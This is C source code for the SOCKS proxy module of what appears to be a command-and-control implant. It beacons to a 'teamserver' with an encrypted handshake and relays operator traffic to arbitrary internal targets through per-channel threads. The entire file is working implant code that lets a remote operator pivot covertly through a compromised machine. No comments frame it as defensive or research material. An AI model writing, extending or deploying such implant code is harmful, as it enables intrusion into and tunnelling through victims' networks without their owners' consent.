#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "comms/socks.h"
#include "protocol.h"
#include "protocol/crypto.h"
#include "comms/session.h"

static socks_channel_t g_socks_channels[MAX_SOCKS_CHANNELS];
static int             g_socks_sock = -1;
static uint8_t         g_socks_key[32];
static uint32_t        g_socks_beacon_id;
static volatile int    g_socks_stopping = 0;
static pthread_mutex_t g_socks_write_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ------------------------------------------------------------------ */
/*  Channel table                                                      */
/* ------------------------------------------------------------------ */

void socks_init(void) {
    memset(g_socks_channels, 0, sizeof(g_socks_channels));
    for (int i = 0; i < MAX_SOCKS_CHANNELS; i++)
        g_socks_channels[i].remote_sock = -1;
}

static socks_channel_t *socks_alloc_channel(uint32_t channel_id) {
    for (int i = 0; i < MAX_SOCKS_CHANNELS; i++) {
        int expected = 0;
        if (__atomic_compare_exchange_n(&g_socks_channels[i].active, &expected,
                                        1, 0, __ATOMIC_ACQ_REL, __ATOMIC_ACQUIRE)) {
            g_socks_channels[i].channel_id = channel_id;
            g_socks_channels[i].remote_sock = -1;
            return &g_socks_channels[i];
        }
    }
    return NULL;
}

static socks_channel_t *socks_find_channel(uint32_t channel_id) {
    for (int i = 0; i < MAX_SOCKS_CHANNELS; i++) {
        if (__atomic_load_n(&g_socks_channels[i].active, __ATOMIC_ACQUIRE) &&
            g_socks_channels[i].channel_id == channel_id)
            return &g_socks_channels[i];
    }
    return NULL;
}

static void socks_free_channel(socks_channel_t *ch) {
    int expected = 1;
    if (__atomic_compare_exchange_n(&ch->active, &expected,
                                    0, 0, __ATOMIC_ACQ_REL, __ATOMIC_ACQUIRE)) {
        if (ch->remote_sock >= 0) {
            close(ch->remote_sock);
            ch->remote_sock = -1;
        }
        ch->channel_id = 0;
    }
}

/* ------------------------------------------------------------------ */
/*  TCP helpers                                                        */
/* ------------------------------------------------------------------ */

static int socks_send_all(int fd, const uint8_t *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = (int)send(fd, buf + sent, (size_t)(len - sent), MSG_NOSIGNAL);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

static int socks_recv_all(int fd, uint8_t *buf, int len) {
    int got = 0;
    while (got < len) {
        int n = (int)recv(fd, buf + got, (size_t)(len - got), 0);
        if (n <= 0) return -1;
        got += n;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/*  Safe write + message builder                                       */
/* ------------------------------------------------------------------ */

static void safe_socks_write(const uint8_t *data, int len) {
    pthread_mutex_lock(&g_socks_write_mutex);
    uint8_t hdr[4];
    hdr[0] = (uint8_t)(len);
    hdr[1] = (uint8_t)(len >> 8);
    hdr[2] = (uint8_t)(len >> 16);
    hdr[3] = (uint8_t)(len >> 24);
    socks_send_all(g_socks_sock, hdr, 4);
    socks_send_all(g_socks_sock, data, len);
    pthread_mutex_unlock(&g_socks_write_mutex);
}

static void send_socks_msg(uint8_t type, uint8_t code, uint32_t channel_id,
                           const uint8_t *payload, uint32_t payload_len) {
    task_header_t th = {0};
    th.type   = type;
    th.code   = code;
    th.label  = channel_id;
    th.length = payload_len;

    uint8_t hdr_buf[16];
    encode_header(&th, hdr_buf);

    int plain_len = 16 + (int)payload_len;
    uint8_t *plain = malloc((size_t)plain_len);
    if (!plain) return;
    memcpy(plain, hdr_buf, 16);
    if (payload && payload_len > 0)
        memcpy(plain + 16, payload, payload_len);

    size_t enc_len = (size_t)plain_len + 64;
    uint8_t *enc = malloc(enc_len);
    if (!enc) { free(plain); return; }

    if (aes_encrypt(g_socks_key, plain, (size_t)plain_len, enc, &enc_len) == 0)
        safe_socks_write(enc, (int)enc_len);

    free(enc);
    free(plain);
}

/* ------------------------------------------------------------------ */
/*  TCP connect to teamserver (SOCKS relay connection)                 */
/* ------------------------------------------------------------------ */

int socks_tcp_connect(const char *host, uint16_t port,
                      const uint8_t *key, uint32_t beacon_id) {
    int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s < 0) return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        close(s);
        return -1;
    }

    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        close(s);
        return -1;
    }

    /* 4-byte beacon ID (LE) */
    uint8_t id_buf[4];
    id_buf[0] = (uint8_t)(beacon_id);
    id_buf[1] = (uint8_t)(beacon_id >> 8);
    id_buf[2] = (uint8_t)(beacon_id >> 16);
    id_buf[3] = (uint8_t)(beacon_id >> 24);
    if (socks_send_all(s, id_buf, 4) != 0) { close(s); return -1; }

    /* 1-byte connection type */
    uint8_t conn_type = CONN_SOCKS;
    if (socks_send_all(s, &conn_type, 1) != 0) { close(s); return -1; }

    /* Encrypted confirmation: beacon_id encrypted with session key */
    uint8_t enc_buf[128];
    size_t enc_len = sizeof(enc_buf);
    if (aes_encrypt(key, id_buf, 4, enc_buf, &enc_len) != 0) {
        close(s);
        return -1;
    }

    /* Send as envelope: 4-byte LE length + ciphertext */
    uint8_t len_buf[4];
    len_buf[0] = (uint8_t)(enc_len);
    len_buf[1] = (uint8_t)(enc_len >> 8);
    len_buf[2] = (uint8_t)(enc_len >> 16);
    len_buf[3] = (uint8_t)(enc_len >> 24);
    if (socks_send_all(s, len_buf, 4) != 0 ||
        socks_send_all(s, enc_buf, (int)enc_len) != 0) {
        close(s);
        return -1;
    }

    g_socks_sock = s;
    memcpy(g_socks_key, key, 32);
    g_socks_beacon_id = beacon_id;
    return 0;
}

/* ------------------------------------------------------------------ */
/*  Connect to remote target (called for each SOCKS_OPEN)              */
/* ------------------------------------------------------------------ */

static int socks_connect_target(const uint8_t *payload, uint32_t payload_len) {
    if (payload_len < 1) return -1;

    uint8_t addr_type = payload[0];
    struct sockaddr_in  sa4;
    struct sockaddr_in6 sa6;
    struct sockaddr *sa;
    socklen_t sa_len;

    memset(&sa4, 0, sizeof(sa4));
    memset(&sa6, 0, sizeof(sa6));

    if (addr_type == 0x01) {
        /* IPv4: 4 bytes addr + 2 bytes port BE */
        if (payload_len < 7) return -1;
        sa4.sin_family = AF_INET;
        memcpy(&sa4.sin_addr, payload + 1, 4);
        sa4.sin_port = *(uint16_t *)(payload + 5);
        sa = (struct sockaddr *)&sa4;
        sa_len = sizeof(sa4);
    } else if (addr_type == 0x03) {
        /* Domain: 1B len + string + 2B port BE */
        if (payload_len < 2) return -1;
        uint8_t dlen = payload[1];
        if (payload_len < (uint32_t)(2 + dlen + 2)) return -1;

        char domain[256];
        memset(domain, 0, sizeof(domain));
        memcpy(domain, payload + 2, dlen);
        domain[dlen] = '\0';
        uint16_t port_be = *(uint16_t *)(payload + 2 + dlen);

        struct addrinfo hints, *result = NULL;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(domain, NULL, &hints, &result) != 0 || !result)
            return -1;
        memcpy(&sa4, result->ai_addr, sizeof(sa4));
        sa4.sin_port = port_be;
        freeaddrinfo(result);
        sa = (struct sockaddr *)&sa4;
        sa_len = sizeof(sa4);
    } else if (addr_type == 0x04) {
        /* IPv6: 16 bytes addr + 2 bytes port BE */
        if (payload_len < 19) return -1;
        sa6.sin6_family = AF_INET6;
        memcpy(&sa6.sin6_addr, payload + 1, 16);
        sa6.sin6_port = *(uint16_t *)(payload + 17);
        sa = (struct sockaddr *)&sa6;
        sa_len = sizeof(sa6);
    } else {
        return -1;
    }

    int family = (addr_type == 0x04) ? AF_INET6 : AF_INET;
    int s = socket(family, SOCK_STREAM, IPPROTO_TCP);
    if (s < 0) return -1;

    /* Non-blocking connect with 15s timeout */
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);

    connect(s, sa, sa_len);

    fd_set wset;
    FD_ZERO(&wset);
    FD_SET(s, &wset);
    struct timeval tv = { .tv_sec = 15, .tv_usec = 0 };

    int sel = select(s + 1, NULL, &wset, NULL, &tv);
    if (sel <= 0) {
        close(s);
        return -1;
    }

    int err = 0;
    socklen_t elen = sizeof(err);
    getsockopt(s, SOL_SOCKET, SO_ERROR, &err, &elen);
    if (err != 0) {
        close(s);
        return -1;
    }

    /* Back to blocking */
    fcntl(s, F_SETFL, flags);
    return s;
}

/* ------------------------------------------------------------------ */
/*  Reader thread (one per channel)                                    */
/* ------------------------------------------------------------------ */

typedef struct {
    socks_channel_t *ch;
} socks_reader_ctx_t;

static void *socks_reader_thread(void *param) {
    socks_reader_ctx_t *ctx = (socks_reader_ctx_t *)param;
    socks_channel_t *ch = ctx->ch;
    free(ctx);

    uint8_t buf[8192];
    for (;;) {
        int n = (int)recv(ch->remote_sock, buf, sizeof(buf), 0);
        if (n <= 0) break;
        send_socks_msg(TASK_SOCKS_DATA, 0, ch->channel_id, buf, (uint32_t)n);
    }

    /* EOF or error — close channel */
    uint32_t cid = ch->channel_id;
    int expected = 1;
    if (__atomic_compare_exchange_n(&ch->active, &expected,
                                    0, 0, __ATOMIC_ACQ_REL, __ATOMIC_ACQUIRE)) {
        close(ch->remote_sock);
        ch->remote_sock = -1;
        ch->channel_id  = 0;
    }
    send_socks_msg(TASK_SOCKS_CLOSE, 0, cid, NULL, 0);
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  Handle SOCKS_OPEN: connect target, ACK, spawn reader              */
/* ------------------------------------------------------------------ */

static void handle_socks_open(uint32_t channel_id,
                              const uint8_t *payload, uint32_t payload_len) {
    socks_channel_t *ch = socks_alloc_channel(channel_id);
    if (!ch) {
        send_socks_msg(TASK_SOCKS_ACK, CODE_SOCKS_FAIL, channel_id, NULL, 0);
        return;
    }

    int rs = socks_connect_target(payload, payload_len);
    if (rs < 0) {
        socks_free_channel(ch);
        send_socks_msg(TASK_SOCKS_ACK, CODE_SOCKS_FAIL, channel_id, NULL, 0);
        return;
    }

    ch->remote_sock = rs;
    send_socks_msg(TASK_SOCKS_ACK, CODE_SOCKS_OK, channel_id, NULL, 0);

    socks_reader_ctx_t *rctx = malloc(sizeof(*rctx));
    if (!rctx) { socks_free_channel(ch); return; }
    rctx->ch = ch;

    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (pthread_create(&tid, &attr, socks_reader_thread, rctx) != 0) {
        pthread_attr_destroy(&attr);
        free(rctx);
        socks_free_channel(ch);
        return;
    }
    pthread_attr_destroy(&attr);
}

/* ------------------------------------------------------------------ */
/*  Main SOCKS loop: read envelopes, dispatch                         */
/* ------------------------------------------------------------------ */

void socks_loop(int sock, const uint8_t *key, uint32_t beacon_id) {
    g_socks_sock      = sock;
    g_socks_stopping  = 0;
    memcpy(g_socks_key, key, 32);
    g_socks_beacon_id = beacon_id;

    struct timeval tv = { .tv_sec = 30, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    for (;;) {
        if (g_socks_stopping) break;
        /* Read envelope: 4-byte LE length + ciphertext */
        uint8_t len_buf[4];
        if (socks_recv_all(sock, len_buf, 4) != 0) break;
        uint32_t env_len = (uint32_t)len_buf[0]        |
                           ((uint32_t)len_buf[1] << 8)  |
                           ((uint32_t)len_buf[2] << 16) |
                           ((uint32_t)len_buf[3] << 24);
        if (env_len > 10 * 1024 * 1024) break;

        uint8_t *env = malloc((size_t)env_len);
        if (!env) break;
        if (socks_recv_all(sock, env, (int)env_len) != 0) {
            free(env);
            break;
        }

        size_t plain_len = (size_t)env_len + 64;
        uint8_t *plain = malloc(plain_len);
        if (!plain) { free(env); break; }

        if (aes_decrypt(key, env, (size_t)env_len, plain, &plain_len) != 0 ||
            plain_len < 16) {
            free(env);
            free(plain);
            continue;
        }
        free(env);

        task_header_t hdr;
        decode_header(plain, &hdr);

        switch (hdr.type) {
        case TASK_SOCKS_OPEN:
            handle_socks_open(hdr.label, plain + 16, hdr.length);
            break;

        case TASK_SOCKS_DATA: {
            socks_channel_t *ch = socks_find_channel(hdr.label);
            if (ch && ch->remote_sock >= 0)
                send(ch->remote_sock, plain + 16, (size_t)hdr.length, MSG_NOSIGNAL);
            break;
        }

        case TASK_SOCKS_CLOSE: {
            socks_channel_t *ch = socks_find_channel(hdr.label);
            if (ch) socks_free_channel(ch);
            break;
        }

        default:
            break;
        }

        free(plain);
    }

    /* Cleanup all channels on disconnect */
    for (int i = 0; i < MAX_SOCKS_CHANNELS; i++)
        socks_free_channel(&g_socks_channels[i]);
    g_socks_sock = -1;
}

/* ------------------------------------------------------------------ */
/*  socks_start: init + connect + spawn loop thread                    */
/* ------------------------------------------------------------------ */

typedef struct {
    int      sock;
    uint8_t  key[32];
    uint32_t beacon_id;
} socks_start_ctx_t;

static void *socks_start_thread(void *arg) {
    socks_start_ctx_t *ctx = (socks_start_ctx_t *)arg;
    socks_loop(ctx->sock, ctx->key, ctx->beacon_id);
    free(ctx);
    return NULL;
}

int socks_start(const char *host, uint16_t port,
                const uint8_t *key, uint32_t beacon_id) {
    socks_init();
    if (socks_tcp_connect(host, port, key, beacon_id) != 0)
        return -1;

    socks_start_ctx_t *ctx = malloc(sizeof(*ctx));
    if (!ctx) { socks_cleanup(); return -1; }
    ctx->sock = g_socks_sock;
    memcpy(ctx->key, key, 32);
    ctx->beacon_id = beacon_id;

    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_attr_setstacksize(&attr, 2 * 1024 * 1024);
    if (pthread_create(&tid, &attr, socks_start_thread, ctx) != 0) {
        pthread_attr_destroy(&attr);
        free(ctx);
        socks_cleanup();
        return -1;
    }
    pthread_attr_destroy(&attr);
    return 0;
}

void socks_cleanup(void) {
    g_socks_stopping = 1;
    for (int i = 0; i < MAX_SOCKS_CHANNELS; i++)
        socks_free_channel(&g_socks_channels[i]);
    if (g_socks_sock >= 0) {
        shutdown(g_socks_sock, SHUT_RDWR);
        close(g_socks_sock);
        g_socks_sock = -1;
    }
}
